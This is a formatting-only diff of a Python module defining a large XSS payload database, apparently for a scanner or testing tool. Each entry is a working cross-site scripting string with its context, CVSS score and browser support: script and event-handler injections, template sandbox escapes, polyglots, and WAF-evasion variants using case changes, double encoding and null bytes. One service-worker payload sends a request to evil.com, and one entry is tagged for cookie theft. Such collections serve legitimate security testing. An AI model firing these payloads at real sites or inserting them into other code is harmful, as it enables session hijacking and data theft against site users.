@@ -18,9 +18,11 @@ from typing import Dict, List, Any, Optional, Tuple
 from dataclasses import dataclass, field
 from datetime import datetime
 
+
 @dataclass
 class PayloadEntry:
     """Enhanced payload entry with metadata"""
+
     payload: str
     contexts: List[str]
     severity: str
@@ -35,6 +37,7 @@ class PayloadEntry:
     reliability: str = "high"
     last_updated: str = field(default_factory=lambda: datetime.now().isoformat())
 
+
 # Comprehensive XSS payload database
 PAYLOAD_DATABASE = {
     # HTML Content XSS
@@ -46,9 +49,8 @@ PAYLOAD_DATABASE = {
         description="Basic script tag injection in HTML content",
         tags=["script", "basic", "classic"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html_img_onerror": PayloadEntry(
         payload="<img src=x onerror=alert(1)>",
         contexts=["html_content", "html_attribute", "markdown_context"],
@@ -57,9 +59,8 @@ PAYLOAD_DATABASE = {
         description="Image error handler XSS",
         tags=["image", "onerror", "event"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html_svg_onload": PayloadEntry(
         payload="<svg onload=alert(1)>",
         contexts=["svg_context", "html_content"],
@@ -68,9 +69,8 @@ PAYLOAD_DATABASE = {
         description="SVG element with onload event",
         tags=["svg", "onload", "vector"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html_iframe_js": PayloadEntry(
         payload="<iframe src=javascript:alert(1)>",
         contexts=["html_attribute", "url_context"],
@@ -79,9 +79,8 @@ PAYLOAD_DATABASE = {
         description="iframe with javascript protocol",
         tags=["iframe", "javascript", "protocol"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # JavaScript Context XSS
     "js_variable_injection": PayloadEntry(
         payload="1; alert(document.cookie); var x=1",
@@ -91,9 +90,8 @@ PAYLOAD_DATABASE = {
         description="Variable injection in JavaScript context",
         tags=["variable", "code-injection", "cookie-theft"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "js_function_injection": PayloadEntry(
         payload="1); alert(1); doSomething(1",
         contexts=["javascript_context"],
@@ -102,9 +100,8 @@ PAYLOAD_DATABASE = {
         description="Function parameter injection",
         tags=["function", "parameter", "code-injection"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "js_string_concat": PayloadEntry(
         payload="' + alert(1) + '",
         contexts=["js_string"],
@@ -113,9 +110,8 @@ PAYLOAD_DATABASE = {
         description="String concatenation XSS",
         tags=["string", "concatenation", "expression"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # Template Injection XSS
     "template_angular": PayloadEntry(
         payload="{{constructor.constructor('alert(1)')()}}",
@@ -125,9 +121,8 @@ PAYLOAD_DATABASE = {
         description="Angular template injection with sandbox escape",
         tags=["angular", "sandbox-escape", "template"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "template_vue": PayloadEntry(
         payload="{{constructor.constructor('alert(1)')()}}",
         contexts=["template_injection"],
@@ -136,9 +131,8 @@ PAYLOAD_DATABASE = {
         description="Vue.js template injection",
         tags=["vue", "template", "expression"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "template_handlebars": PayloadEntry(
         payload="{{#with 'alert(1)' as |x|}}{{/with}}",
         contexts=["template_injection"],
@@ -147,9 +141,8 @@ PAYLOAD_DATABASE = {
         description="Handlebars template injection",
         tags=["handlebars", "template", "helper"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # WebSocket XSS
     "websocket_message": PayloadEntry(
         payload='{"type": "chat", "message": "<script>alert(1)</script>"}',
@@ -159,9 +152,8 @@ PAYLOAD_DATABASE = {
         description="WebSocket message injection",
         tags=["websocket", "realtime", "json"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "websocket_username": PayloadEntry(
         payload='{"type": "user_joined", "username": "<script>alert(1)</script>"}',
         contexts=["websocket_xss"],
@@ -170,9 +162,8 @@ PAYLOAD_DATABASE = {
         description="WebSocket username injection",
         tags=["websocket", "username", "display"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # Service Worker XSS
     "sw_cache_injection": PayloadEntry(
         payload="data:text/javascript,self.addEventListener('install',function(){fetch('http://evil.com/steal')})",
@@ -182,9 +173,8 @@ PAYLOAD_DATABASE = {
         description="Service Worker cache injection",
         tags=["service-worker", "cache", "data-uri"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "sw_offline_xss": PayloadEntry(
         payload="data:text/html,<script>alert('Offline XSS')</script>",
         contexts=["service_worker_xss", "html_content"],
@@ -193,9 +183,8 @@ PAYLOAD_DATABASE = {
         description="Service Worker offline page XSS",
         tags=["service-worker", "offline", "data-uri"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # WebRTC XSS
     "webrtc_data_channel": PayloadEntry(
         payload='{"type": "chat", "message": "<script>alert(1)</script>"}',
@@ -205,9 +194,8 @@ PAYLOAD_DATABASE = {
         description="WebRTC data channel injection",
         tags=["webrtc", "p2p", "data-channel"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "webrtc_signaling": PayloadEntry(
         payload='{"type": "offer", "from": "<script>alert(1)</script>"}',
         contexts=["webrtc_xss"],
@@ -216,9 +204,8 @@ PAYLOAD_DATABASE = {
         description="WebRTC signaling message injection",
         tags=["webrtc", "signaling", "sdp"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # GraphQL XSS
     "graphql_query_injection": PayloadEntry(
         payload='query { user(id: "<script>alert(1)</script>") { name } }',
@@ -228,9 +215,8 @@ PAYLOAD_DATABASE = {
         description="GraphQL query parameter injection",
         tags=["graphql", "query", "parameter"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "graphql_mutation_xss": PayloadEntry(
         payload='mutation { updateProfile(input: { displayName: "<script>alert(1)</script>" }) { success } }',
         contexts=["graphql_xss"],
@@ -239,32 +225,29 @@ PAYLOAD_DATABASE = {
         description="GraphQL mutation input injection",
         tags=["graphql", "mutation", "input"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # Shadow DOM XSS
     "shadow_slot_injection": PayloadEntry(
-        payload="<span slot=\"content\"><script>alert(1)</script></span>",
+        payload='<span slot="content"><script>alert(1)</script></span>',
         contexts=["shadow_dom_xss", "html_content"],
         severity="high",
         cvss_score=7.3,
         description="Shadow DOM slot content injection",
         tags=["shadow-dom", "slot", "encapsulation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "shadow_attribute_xss": PayloadEntry(
-        payload="<my-component title=\"<script>alert(1)</script>\"></my-component>",
+        payload='<my-component title="<script>alert(1)</script>"></my-component>',
         contexts=["shadow_dom_xss", "custom_elements_xss"],
         severity="high",
         cvss_score=7.3,
         description="Shadow DOM attribute injection",
         tags=["shadow-dom", "attribute", "component"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # Custom Elements XSS
     "ce_element_name": PayloadEntry(
         payload="<script>alert(1)</script>",
@@ -274,20 +257,18 @@ PAYLOAD_DATABASE = {
         description="Custom element name injection",
         tags=["custom-elements", "element-name", "definition"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "ce_attribute_xss": PayloadEntry(
-        payload="<my-component data-value=\"<script>alert(1)</script>\"></my-component>",
+        payload='<my-component data-value="<script>alert(1)</script>"></my-component>',
         contexts=["custom_elements_xss", "html_attribute"],
         severity="high",
         cvss_score=7.1,
         description="Custom element attribute XSS",
         tags=["custom-elements", "attribute", "property"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # HTTP/2 Push XSS
     "http2_push_path": PayloadEntry(
         payload="/api/user/<script>alert(1)</script>",
@@ -297,20 +278,18 @@ PAYLOAD_DATABASE = {
         description="HTTP/2 push path injection",
         tags=["http2", "push", "path-injection"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "http2_push_content": PayloadEntry(
-        payload="var userName = \"<script>alert(1)</script>\";",
+        payload='var userName = "<script>alert(1)</script>";',
         contexts=["http2_push_xss", "javascript_context"],
         severity="medium",
         cvss_score=6.8,
         description="HTTP/2 push content injection",
         tags=["http2", "push", "content-injection"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # Advanced HTML bypasses
     "html_polyglot": PayloadEntry(
         payload="javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)//",
@@ -320,20 +299,18 @@ PAYLOAD_DATABASE = {
         description="Polyglot XSS working across multiple contexts",
         tags=["polyglot", "universal", "bypass"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html_mutation_xss": PayloadEntry(
-        payload="<noscript><p title=\"</noscript><script>alert(1)\">",
+        payload='<noscript><p title="</noscript><script>alert(1)">',
         contexts=["html_content"],
         severity="high",
         cvss_score=7.5,
         description="Mutation XSS (mXSS) using noscript",
         tags=["mxss", "mutation", "noscript"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "html_entity_bypass": PayloadEntry(
         payload="&lt;script&gt;alert(1)&lt;/script&gt;",
         contexts=["html_content"],
@@ -342,9 +319,8 @@ PAYLOAD_DATABASE = {
         description="HTML entity encoded XSS",
         tags=["encoding", "entity", "bypass"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # CSS Context XSS
     "css_expression": PayloadEntry(
         payload="expression(alert(1))",
@@ -354,9 +330,8 @@ PAYLOAD_DATABASE = {
         description="CSS expression injection (legacy IE)",
         tags=["css", "expression", "legacy"],
         browser_support=["edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "css_url_injection": PayloadEntry(
         payload="url('javascript:alert(1)')",
         contexts=["css_context", "url_context"],
@@ -365,9 +340,8 @@ PAYLOAD_DATABASE = {
         description="CSS URL injection",
         tags=["css", "url", "background"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # URL Context XSS
     "url_javascript_protocol": PayloadEntry(
         payload="javascript:alert(1)",
@@ -377,9 +351,8 @@ PAYLOAD_DATABASE = {
         description="JavaScript protocol injection",
         tags=["url", "javascript", "protocol"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "url_data_uri": PayloadEntry(
         payload="data:text/html,<script>alert(1)</script>",
         contexts=["url_context"],
@@ -388,9 +361,8 @@ PAYLOAD_DATABASE = {
         description="Data URI injection",
         tags=["url", "data-uri", "html"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "url_vbscript": PayloadEntry(
         payload="vbscript:msgbox(1)",
         contexts=["url_context"],
@@ -399,9 +371,8 @@ PAYLOAD_DATABASE = {
         description="VBScript protocol injection",
         tags=["url", "vbscript", "legacy"],
         browser_support=["edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     # Comment-based XSS
     "html_comment_xss": PayloadEntry(
         payload="<!-- <script>alert(1)</script> -->",
@@ -411,9 +382,8 @@ PAYLOAD_DATABASE = {
         description="HTML comment XSS",
         tags=["comment", "hidden", "bypass"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # DOM XSS
     "dom_location_hash": PayloadEntry(
         payload="location.hash",
@@ -423,9 +393,8 @@ PAYLOAD_DATABASE = {
         description="DOM XSS via location.hash",
         tags=["dom", "location", "hash"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "dom_document_referrer": PayloadEntry(
         payload="document.referrer",
         contexts=["dom_xss"],
@@ -434,9 +403,8 @@ PAYLOAD_DATABASE = {
         description="DOM XSS via document.referrer",
         tags=["dom", "referrer", "header"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # WAF Bypass techniques
     "waf_case_variation": PayloadEntry(
         payload="<ScRiPt>alert(1)</ScRiPt>",
@@ -447,9 +415,8 @@ PAYLOAD_DATABASE = {
         tags=["waf-bypass", "case", "filter-evasion"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="high",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "waf_double_encoding": PayloadEntry(
         payload="%253Cscript%253Ealert(1)%253C/script%253E",
         contexts=["html_content"],
@@ -459,9 +426,8 @@ PAYLOAD_DATABASE = {
         tags=["waf-bypass", "encoding", "double"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="high",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "waf_null_byte": PayloadEntry(
         payload="<script>alert(1)</script>%00",
         contexts=["html_content"],
@@ -471,9 +437,8 @@ PAYLOAD_DATABASE = {
         tags=["waf-bypass", "null-byte", "termination"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="medium",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     # Advanced encoding bypasses
     "encoding_unicode": PayloadEntry(
         payload="\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
@@ -483,9 +448,8 @@ PAYLOAD_DATABASE = {
         description="Unicode encoding bypass",
         tags=["encoding", "unicode", "bypass"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "encoding_hex": PayloadEntry(
         payload="\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
         contexts=["javascript_context"],
@@ -494,9 +458,8 @@ PAYLOAD_DATABASE = {
         description="Hex encoding bypass",
         tags=["encoding", "hex", "javascript"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # Modern web attacks
     "postmessage_xss": PayloadEntry(
         payload='{"type": "message", "content": "<script>alert(1)</script>"}',
@@ -506,20 +469,18 @@ PAYLOAD_DATABASE = {
         description="PostMessage API XSS",
         tags=["postmessage", "cross-origin", "communication"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "wasm_xss": PayloadEntry(
-        payload="(module (func $xss (export \"xss\") (call $alert)))",
+        payload='(module (func $xss (export "xss") (call $alert)))',
         contexts=["wasm_context"],
         severity="medium",
         cvss_score=6.1,
         description="WebAssembly XSS",
         tags=["wasm", "binary", "low-level"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # SVG-specific attacks
     "svg_script_element": PayloadEntry(
         payload="<svg><script>alert(1)</script></svg>",
@@ -529,9 +490,8 @@ PAYLOAD_DATABASE = {
         description="SVG with script element",
         tags=["svg", "script", "vector"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "svg_foreign_object": PayloadEntry(
         payload="<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
         contexts=["svg_context"],
@@ -540,9 +500,8 @@ PAYLOAD_DATABASE = {
         description="SVG foreign object XSS",
         tags=["svg", "foreign-object", "html"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # JSON context
     "json_value_xss": PayloadEntry(
         payload='{"user": "<script>alert(1)</script>"}',
@@ -552,9 +511,8 @@ PAYLOAD_DATABASE = {
         description="JSON value XSS",
         tags=["json", "data", "serialization"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # XML context
     "xml_content_xss": PayloadEntry(
         payload="<user><name><script>alert(1)</script></name></user>",
@@ -564,9 +522,8 @@ PAYLOAD_DATABASE = {
         description="XML content XSS",
         tags=["xml", "markup", "data"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # Markdown context
     "markdown_script": PayloadEntry(
         payload="<script>alert(1)</script>",
@@ -576,32 +533,29 @@ PAYLOAD_DATABASE = {
         description="Markdown script injection",
         tags=["markdown", "script", "formatting"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # Additional HTML attribute attacks
     "html_form_action": PayloadEntry(
-        payload="<form action=\"javascript:alert(1)\"><input type=submit></form>",
+        payload='<form action="javascript:alert(1)"><input type=submit></form>',
         contexts=["html_attribute"],
         severity="high",
         cvss_score=7.5,
         description="Form action XSS",
         tags=["form", "action", "submission"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html_link_href": PayloadEntry(
-        payload="<a href=\"javascript:alert(1)\">Click me</a>",
+        payload='<a href="javascript:alert(1)">Click me</a>',
         contexts=["html_attribute", "url_context"],
         severity="high",
         cvss_score=7.5,
         description="Link href XSS",
         tags=["link", "href", "navigation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html_style_background": PayloadEntry(
         payload="<div style=\"background:url('javascript:alert(1)')\"></div>",
         contexts=["html_attribute", "css_context"],
@@ -610,32 +564,29 @@ PAYLOAD_DATABASE = {
         description="Style background XSS",
         tags=["style", "css", "background"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # Event handler attacks
     "html_onclick": PayloadEntry(
-        payload="<div onclick=\"alert(1)\">Click me</div>",
+        payload='<div onclick="alert(1)">Click me</div>',
         contexts=["html_attribute"],
         severity="high",
         cvss_score=7.5,
         description="onclick event handler XSS",
         tags=["event", "onclick", "handler"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html_onload": PayloadEntry(
-        payload="<body onload=\"alert(1)\">",
+        payload='<body onload="alert(1)">',
         contexts=["html_content"],
         severity="high",
         cvss_score=7.5,
         description="onload event handler XSS",
         tags=["event", "onload", "body"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # Filter bypass techniques
     "filter_comment_bypass": PayloadEntry(
         payload="<!--><script>alert(1)</script>",
@@ -646,9 +597,8 @@ PAYLOAD_DATABASE = {
         tags=["comment", "bypass", "filter-evasion"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="high",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "filter_newline_bypass": PayloadEntry(
         payload="<script>\nalert(1)\n</script>",
         contexts=["html_content"],
@@ -658,9 +608,8 @@ PAYLOAD_DATABASE = {
         tags=["newline", "bypass", "formatting"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="medium",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     # Advanced JavaScript attacks
     "js_eval_injection": PayloadEntry(
         payload="'; eval('alert(1)'); '",
@@ -670,9 +619,8 @@ PAYLOAD_DATABASE = {
         description="JavaScript eval injection",
         tags=["eval", "code-execution", "dangerous"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "js_function_constructor": PayloadEntry(
         payload="Function('alert(1)')()",
         contexts=["javascript_context"],
@@ -681,9 +629,8 @@ PAYLOAD_DATABASE = {
         description="Function constructor XSS",
         tags=["function", "constructor", "code-execution"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # Protocol confusion
     "protocol_confusion": PayloadEntry(
         payload="file://<script>alert(1)</script>",
@@ -693,9 +640,8 @@ PAYLOAD_DATABASE = {
         description="File protocol confusion",
         tags=["protocol", "file", "confusion"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # Dangling markup
     "dangling_markup": PayloadEntry(
         payload='"><script>alert(1)</script>',
@@ -705,9 +651,8 @@ PAYLOAD_DATABASE = {
         description="Dangling markup injection",
         tags=["dangling", "attribute-breakout", "markup"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More advanced payloads
     "advanced_polyglot": PayloadEntry(
         payload="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onCliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
@@ -718,9 +663,8 @@ PAYLOAD_DATABASE = {
         tags=["polyglot", "advanced", "universal-bypass"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="high",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     # Modern framework attacks
     "react_jsx": PayloadEntry(
         payload="<img src=x onerror=alert(1)>",
@@ -730,20 +674,18 @@ PAYLOAD_DATABASE = {
         description="React JSX injection",
         tags=["react", "jsx", "framework"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "vue_directive": PayloadEntry(
-        payload="v-html=\"<script>alert(1)</script>\"",
+        payload='v-html="<script>alert(1)</script>"',
         contexts=["template_injection"],
         severity="high",
         cvss_score=7.5,
         description="Vue directive injection",
         tags=["vue", "directive", "v-html"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # More comprehensive payload coverage
     "comprehensive_1": PayloadEntry(
         payload="<details open ontoggle=alert(1)>",
@@ -753,9 +695,8 @@ PAYLOAD_DATABASE = {
         description="HTML5 details element XSS",
         tags=["html5", "details", "ontoggle"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_2": PayloadEntry(
         payload="<marquee onstart=alert(1)>XSS</marquee>",
         contexts=["html_content"],
@@ -764,9 +705,8 @@ PAYLOAD_DATABASE = {
         description="Marquee element XSS",
         tags=["marquee", "legacy", "deprecated"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "comprehensive_3": PayloadEntry(
         payload="<keygen onfocus=alert(1) autofocus>",
         contexts=["html_content"],
@@ -775,20 +715,18 @@ PAYLOAD_DATABASE = {
         description="Keygen element XSS",
         tags=["keygen", "legacy", "deprecated"],
         browser_support=["chrome", "firefox"],
-        reliability="low"
+        reliability="low",
     ),
-
     "comprehensive_4": PayloadEntry(
-        payload="<object data=\"javascript:alert(1)\">",
+        payload='<object data="javascript:alert(1)">',
         contexts=["html_attribute"],
         severity="high",
         cvss_score=7.5,
         description="Object element XSS",
         tags=["object", "data", "embed"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_5": PayloadEntry(
         payload="<video><source onerror=alert(1)>",
         contexts=["html_content"],
@@ -797,9 +735,8 @@ PAYLOAD_DATABASE = {
         description="Video source error XSS",
         tags=["video", "media", "onerror"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # Additional HTML Content payloads
     "html_body_onload": PayloadEntry(
         payload="<body onload=alert(1)>",
@@ -809,9 +746,8 @@ PAYLOAD_DATABASE = {
         description="Body onload event XSS",
         tags=["body", "onload", "event"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html_input_onfocus": PayloadEntry(
         payload="<input onfocus=alert(1) autofocus>",
         contexts=["html_content"],
@@ -820,9 +756,8 @@ PAYLOAD_DATABASE = {
         description="Input focus event XSS",
         tags=["input", "onfocus", "autofocus"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html_select_onchange": PayloadEntry(
         payload="<select onchange=alert(1)><option>1</select>",
         contexts=["html_content"],
@@ -831,9 +766,8 @@ PAYLOAD_DATABASE = {
         description="Select change event XSS",
         tags=["select", "onchange", "form"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html_textarea_onblur": PayloadEntry(
         payload="<textarea onblur=alert(1)>XSS</textarea>",
         contexts=["html_content"],
@@ -842,9 +776,8 @@ PAYLOAD_DATABASE = {
         description="Textarea blur event XSS",
         tags=["textarea", "onblur", "form"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More JavaScript Context payloads
     "js_object_injection": PayloadEntry(
         payload="1, alert: alert(1), real: 1",
@@ -854,9 +787,8 @@ PAYLOAD_DATABASE = {
         description="JavaScript object property injection",
         tags=["object", "property", "injection"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "js_array_injection": PayloadEntry(
         payload="1], alert(1), x: 1]",
         contexts=["javascript_context"],
@@ -865,9 +797,8 @@ PAYLOAD_DATABASE = {
         description="JavaScript array injection",
         tags=["array", "injection", "code-execution"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "js_template_literal": PayloadEntry(
         payload="`${alert(1)}`",
         contexts=["js_string"],
@@ -876,9 +807,8 @@ PAYLOAD_DATABASE = {
         description="JavaScript template literal XSS",
         tags=["template-literal", "es6", "expression"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More CSS Context payloads
     "css_import_injection": PayloadEntry(
         payload="@import 'javascript:alert(1)'",
@@ -888,9 +818,8 @@ PAYLOAD_DATABASE = {
         description="CSS import injection",
         tags=["css", "import", "external"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "css_filter_injection": PayloadEntry(
         payload="filter: url('javascript:alert(1)')",
         contexts=["css_context"],
@@ -899,9 +828,8 @@ PAYLOAD_DATABASE = {
         description="CSS filter injection",
         tags=["css", "filter", "svg"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More SVG Context payloads
     "svg_animatetransform": PayloadEntry(
         payload="<svg><animateTransform onbegin=alert(1) attributeName=transform dur=1s>",
@@ -911,9 +839,8 @@ PAYLOAD_DATABASE = {
         description="SVG animateTransform XSS",
         tags=["svg", "animation", "transform"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "svg_pattern_injection": PayloadEntry(
         payload="<svg><pattern><script>alert(1)</script></pattern></svg>",
         contexts=["svg_context"],
@@ -922,9 +849,8 @@ PAYLOAD_DATABASE = {
         description="SVG pattern with script",
         tags=["svg", "pattern", "script"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More URL Context payloads
     "url_file_protocol": PayloadEntry(
         payload="file://<script>alert(1)</script>",
@@ -934,9 +860,8 @@ PAYLOAD_DATABASE = {
         description="File protocol confusion",
         tags=["url", "file", "protocol"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "url_ftp_protocol": PayloadEntry(
         payload="ftp://example.com/<script>alert(1)</script>",
         contexts=["url_context"],
@@ -945,9 +870,8 @@ PAYLOAD_DATABASE = {
         description="FTP protocol injection",
         tags=["url", "ftp", "protocol"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     # More Comment Context payloads
     "html_comment_conditional": PayloadEntry(
         payload="<!--[if IE]><script>alert(1)</script><![endif]-->",
@@ -957,9 +881,8 @@ PAYLOAD_DATABASE = {
         description="Conditional comment XSS",
         tags=["comment", "conditional", "ie"],
         browser_support=["edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "css_comment_injection": PayloadEntry(
         payload="/* <script>alert(1)</script> */ body { color: red; }",
         contexts=["css_context"],
@@ -968,9 +891,8 @@ PAYLOAD_DATABASE = {
         description="CSS comment injection",
         tags=["css", "comment", "hidden"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     # More DOM XSS payloads
     "dom_location_search": PayloadEntry(
         payload="location.search",
@@ -980,9 +902,8 @@ PAYLOAD_DATABASE = {
         description="DOM XSS via location.search",
         tags=["dom", "location", "search"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "dom_document_url": PayloadEntry(
         payload="document.URL",
         contexts=["dom_xss"],
@@ -991,9 +912,8 @@ PAYLOAD_DATABASE = {
         description="DOM XSS via document.URL",
         tags=["dom", "document", "url"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "dom_window_name": PayloadEntry(
         payload="window.name",
         contexts=["dom_xss"],
@@ -1002,21 +922,19 @@ PAYLOAD_DATABASE = {
         description="DOM XSS via window.name",
         tags=["dom", "window", "name"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # More Template Injection payloads
